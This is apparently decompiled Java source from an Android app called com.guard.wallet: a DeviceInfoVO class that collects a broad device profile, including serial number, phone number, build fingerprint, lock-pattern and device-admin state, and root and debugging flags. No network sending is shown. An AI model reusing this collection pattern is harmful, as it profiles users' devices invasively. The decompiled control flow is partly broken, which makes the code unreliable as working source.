package com.guard.wallet.resp;

import a1.AbstractC0026q;
import android.annotation.SuppressLint;
import android.os.Build;
import android.support.annotation.NonNull;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.Serializable;
import java.util.Arrays;
import java.util.List;
import p000a.AbstractC0000a;

/* loaded from: classes.dex */
public class DeviceInfoVO implements Serializable {
    private Integer apiGrade;
    private BatteryLevelVO batteryLevel;
    private String board;
    private String brandCode;
    private String codeName;
    private String device;
    private DeviceAdminVO deviceAdmin;
    private String deviceId;
    private String deviceToken;
    private String deviceUid;
    private String displayId;
    private Integer enableDebug;
    private Integer enableDevelopment;
    private Integer enableWifiDebug;
    private String factoryTime;
    private String fingerPrint;
    private String hardwareName;
    private String incremental;
    private Integer isRoot;
    private String langCode;
    private LockPatternVO lockPattern;
    private String manufacturer;
    private String model;
    private String optimalABI;
    private String osArch;
    private String osName;
    private String osVersion;
    private String packageName;
    private String phoneNumber;
    private String product;
    private String release;
    private ScreenMetricsVO screen;
    private String serial;
    private List<String> supportABI;
    private String trusteeId;

    public DeviceInfoVO() {
    }

    public DeviceInfoVO(String str, String str2, String str3, String str4, String str5, String str6, String str7, String str8, String str9, String str10, String str11, String str12, String str13, String str14, String str15, String str16, String str17, String str18, Integer num, String str19, String str20, String str21, String str22, ScreenMetricsVO screenMetricsVO, DeviceAdminVO deviceAdminVO, LockPatternVO lockPatternVO, BatteryLevelVO batteryLevelVO, Integer num2, Integer num3, Integer num4, Integer num5, String str23, String str24, String str25) {
        this.deviceId = str;
        this.deviceUid = str2;
        this.packageName = str3;
        this.deviceToken = str4;
        this.displayId = str5;
        this.board = str6;
        this.brandCode = str7;
        this.optimalABI = str8;
        this.device = str9;
        this.fingerPrint = str10;
        this.serial = str11;
        this.manufacturer = str12;
        this.model = str13;
        this.hardwareName = str14;
        this.product = str15;
        this.codeName = str16;
        this.incremental = str17;
        this.release = str18;
        this.apiGrade = num;
        this.osVersion = str19;
        this.osName = str20;
        this.osArch = str21;
        this.langCode = str22;
        this.screen = screenMetricsVO;
        this.deviceAdmin = deviceAdminVO;
        this.lockPattern = lockPatternVO;
        this.batteryLevel = batteryLevelVO;
        this.isRoot = num2;
        this.enableDevelopment = num3;
        this.enableDebug = num4;
        this.enableWifiDebug = num5;
        this.phoneNumber = str23;
        this.factoryTime = str24;
        this.trusteeId = str25;
    }

    @SuppressLint({"HardwareIds"})
    public static DeviceInfoVO of() {
        String str;
        long j2;
        DeviceInfoVO deviceInfoVO = new DeviceInfoVO();
        deviceInfoVO.setDeviceUid(AbstractC0249e.m614c());
        if (MainApplication.getInstance() != null) {
            deviceInfoVO.setPackageName(MainApplication.getInstance().getPackageName());
        }
        deviceInfoVO.setDeviceToken(AbstractC0252h.m708l("deviceToken"));
        deviceInfoVO.setDisplayId(Build.DISPLAY);
        deviceInfoVO.setBoard(Build.BOARD);
        deviceInfoVO.setBrandCode(Build.BRAND);
        String[] strArr = Build.SUPPORTED_ABIS;
        if (strArr != null && strArr.length > 0) {
            deviceInfoVO.setSupportABI(Arrays.asList(strArr));
            deviceInfoVO.setOptimalABI(strArr[0]);
        }
        deviceInfoVO.setDevice(Build.DEVICE);
        deviceInfoVO.setFingerPrint(Build.FINGERPRINT);
        deviceInfoVO.setSerial(Build.SERIAL);
        deviceInfoVO.setManufacturer(Build.MANUFACTURER);
        deviceInfoVO.setModel(Build.MODEL);
        deviceInfoVO.setHardwareName(Build.HARDWARE);
        deviceInfoVO.setProduct(Build.PRODUCT);
        deviceInfoVO.setRelease(Build.VERSION.RELEASE);
        deviceInfoVO.setCodeName(Build.VERSION.CODENAME);
        deviceInfoVO.setIncremental(Build.VERSION.INCREMENTAL);
        deviceInfoVO.setApiGrade(Integer.valueOf(Build.VERSION.SDK_INT));
        deviceInfoVO.setOsVersion(System.getProperty("os.version"));
        deviceInfoVO.setOsName(System.getProperty("os.name"));
        deviceInfoVO.setOsArch(System.getProperty("os.arch"));
        deviceInfoVO.setLangCode(AbstractC0252h.m709m());
        deviceInfoVO.setScreen(AbstractC0249e.m616e());
        deviceInfoVO.setDeviceAdmin(AbstractC0251g.C0());
        deviceInfoVO.setLockPattern(AbstractC0251g.B0());
        deviceInfoVO.setBatteryLevel(AbstractC0026q.m174d());
        deviceInfoVO.setIsRoot(AbstractC0026q.m175e() ? 1 : 0);
        deviceInfoVO.setEnableDevelopment(AbstractC0251g.m638K() ? 1 : 0);
        deviceInfoVO.setEnableDebug(AbstractC0251g.m636I() ? 1 : 0);
        deviceInfoVO.setEnableWifiDebug(AbstractC0251g.m637J() ? 1 : 0);
        deviceInfoVO.setPhoneNumber(AbstractC0249e.m625n());
        String str2 = null;
        try {
            j2 = Build.TIME;
        } catch (Exception e2) {
            AbstractC0026q.m186s("DeviceUtils", e2);
        }
        if (j2 > 0) {
            str = String.valueOf(j2);
            deviceInfoVO.setFactoryTime(str);
            Integer num = AbstractC0248d.f402a;
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getBuildConfig() != null && !AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getTrusteeId())) {
                str2 = MainApplication.getInstance().getBuildConfig().getTrusteeId();
            }
            deviceInfoVO.setTrusteeId(str2);
            return deviceInfoVO;
        }
        str = null;
        deviceInfoVO.setFactoryTime(str);
        Integer num2 = AbstractC0248d.f402a;
        if (MainApplication.getInstance() != null) {
            str2 = MainApplication.getInstance().getBuildConfig().getTrusteeId();
        }
        deviceInfoVO.setTrusteeId(str2);
        return deviceInfoVO;
    }

    public Integer getApiGrade() {
        return this.apiGrade;
    }

    public BatteryLevelVO getBatteryLevel() {
        return this.batteryLevel;
    }

    public String getBoard() {
        return this.board;
    }

    public String getBrandCode() {
        return this.brandCode;
    }

    public String getCodeName() {
        return this.codeName;
    }

    public String getDevice() {
        return this.device;
    }

    public DeviceAdminVO getDeviceAdmin() {
        return this.deviceAdmin;
    }

    public String getDeviceId() {
        return this.deviceId;
    }

    public String getDeviceToken() {
        return this.deviceToken;
    }

    public String getDeviceUid() {
        return this.deviceUid;
    }

    public String getDisplayId() {
        return this.displayId;
    }

    public Integer getEnableDebug() {
        return this.enableDebug;
    }

    public Integer getEnableDevelopment() {
        return this.enableDevelopment;
    }

    public Integer getEnableWifiDebug() {
        return this.enableWifiDebug;
    }

    public String getFactoryTime() {
        return this.factoryTime;
    }

    public String getFingerPrint() {
        return this.fingerPrint;
    }

    public String getHardwareName() {
        return this.hardwareName;
    }

    public String getIncremental() {
        return this.incremental;
    }

    public Integer getIsRoot() {
        return this.isRoot;
    }

    public String getLangCode() {
        return this.langCode;
    }

    public LockPatternVO getLockPattern() {
        return this.lockPattern;
    }

    public String getManufacturer() {
        return this.manufacturer;
    }

    public String getModel() {
        return this.model;
    }

    public String getOptimalABI() {
        return this.optimalABI;
    }

    public String getOsArch() {
        return this.osArch;
    }

    public String getOsName() {
        return this.osName;
    }

    public String getOsVersion() {
        return this.osVersion;
    }

    public String getPackageName() {
        return this.packageName;
    }

    public String getPhoneNumber() {
        return this.phoneNumber;
    }

    public String getProduct() {
        return this.product;
    }

    public String getRelease() {
        return this.release;
    }

    public ScreenMetricsVO getScreen() {
        return this.screen;
    }

    public String getSerial() {
        return this.serial;
    }

    public List<String> getSupportABI() {
        return this.supportABI;
    }

    public String getTrusteeId() {
        return this.trusteeId;
    }

    public void setApiGrade(Integer num) {
        this.apiGrade = num;
    }

    public void setBatteryLevel(BatteryLevelVO batteryLevelVO) {
        this.batteryLevel = batteryLevelVO;
    }

    public void setBoard(String str) {
        this.board = str;
    }

    public void setBrandCode(String str) {
        this.brandCode = str;
    }

    public void setCodeName(String str) {
        this.codeName = str;
    }

    public void setDevice(String str) {
        this.device = str;
    }

    public void setDeviceAdmin(DeviceAdminVO deviceAdminVO) {
        this.deviceAdmin = deviceAdminVO;
    }

    public void setDeviceId(String str) {
        this.deviceId = str;
    }

    public void setDeviceToken(String str) {
        this.deviceToken = str;
    }

    public void setDeviceUid(String str) {
        this.deviceUid = str;
    }

    public void setDisplayId(String str) {
        this.displayId = str;
    }

    public void setEnableDebug(Integer num) {
        this.enableDebug = num;
    }

    public void setEnableDevelopment(Integer num) {
        this.enableDevelopment = num;
    }

    public void setEnableWifiDebug(Integer num) {
        this.enableWifiDebug = num;
    }

    public void setFactoryTime(String str) {
        this.factoryTime = str;
    }

    public void setFingerPrint(String str) {
        this.fingerPrint = str;
    }

    public void setHardwareName(String str) {
        this.hardwareName = str;
    }

    public void setIncremental(String str) {
        this.incremental = str;
    }

    public void setIsRoot(Integer num) {
        this.isRoot = num;
    }

    public void setLangCode(String str) {
        this.langCode = str;
    }

    public void setLockPattern(LockPatternVO lockPatternVO) {
        this.lockPattern = lockPatternVO;
    }

    public void setManufacturer(String str) {
        this.manufacturer = str;
    }

    public void setModel(String str) {
        this.model = str;
    }

    public void setOptimalABI(String str) {
        this.optimalABI = str;
    }

    public void setOsArch(String str) {
        this.osArch = str;
    }

    public void setOsName(String str) {
        this.osName = str;
    }

    public void setOsVersion(String str) {
        this.osVersion = str;
    }

    public void setPackageName(String str) {
        this.packageName = str;
    }

    public void setPhoneNumber(String str) {
        this.phoneNumber = str;
    }

    public void setProduct(String str) {
        this.product = str;
    }

    public void setRelease(String str) {
        this.release = str;
    }

    public void setScreen(ScreenMetricsVO screenMetricsVO) {
        this.screen = screenMetricsVO;
    }

    public void setSerial(String str) {
        this.serial = str;
    }

    public void setSupportABI(List<String> list) {
        this.supportABI = list;
    }

    public void setTrusteeId(String str) {
        this.trusteeId = str;
    }

    @NonNull
    public String toString() {
        StringBuilder sb = new StringBuilder("DeviceInfoVO{deviceUid='");
        sb.append(this.deviceUid);
        sb.append("', deviceId='");
        sb.append(this.deviceId);
        sb.append("', packageName='");
        sb.append(this.packageName);
        sb.append("', deviceToken='");
        sb.append(this.deviceToken);
        sb.append("', displayId='");
        sb.append(this.displayId);
        sb.append("', board='");
        sb.append(this.board);
        sb.append("', brandCode='");
        sb.append(this.brandCode);
        sb.append("', supportABI='");
        sb.append(this.supportABI);
        sb.append("', optimalABI='");
        sb.append(this.optimalABI);
        sb.append("', device='");
        sb.append(this.device);
        sb.append("', fingerPrint='");
        sb.append(this.fingerPrint);
        sb.append("', serial='");
        sb.append(this.serial);
        sb.append("', manufacturer='");
        sb.append(this.manufacturer);
        sb.append("', model='");
        sb.append(this.model);
        sb.append("', hardwareName='");
        sb.append(this.hardwareName);
        sb.append("', product='");
        sb.append(this.product);
        sb.append("', codeName='");
        sb.append(this.codeName);
        sb.append("', incremental='");
        sb.append(this.incremental);
        sb.append("', release='");
        sb.append(this.release);
        sb.append("', apiGrade=");
        sb.append(this.apiGrade);
        sb.append(", osVersion='");
        sb.append(this.osVersion);
        sb.append("', osName='");
        sb.append(this.osName);
        sb.append("', osArch='");
        sb.append(this.osArch);
        sb.append("', langCode='");
        sb.append(this.langCode);
        sb.append("', screen=");
        sb.append(this.screen);
        sb.append("', deviceAdmin=");
        sb.append(this.deviceAdmin);
        sb.append("', lockPattern=");
        sb.append(this.lockPattern);
        sb.append("', isRoot=");
        sb.append(this.isRoot);
        sb.append("', enableDevelopment=");
        sb.append(this.enableDevelopment);
        sb.append("', enableDebug=");
        sb.append(this.enableDebug);
        sb.append("', enableWifiDebug=");
        sb.append(this.enableWifiDebug);
        sb.append("', phoneNumber=");
        sb.append(this.phoneNumber);
        sb.append("', factoryTime=");
        sb.append(this.factoryTime);
        sb.append("', trusteeId=");
        return AbstractC0000a.m18n(sb, this.trusteeId, "'}");
    }
}
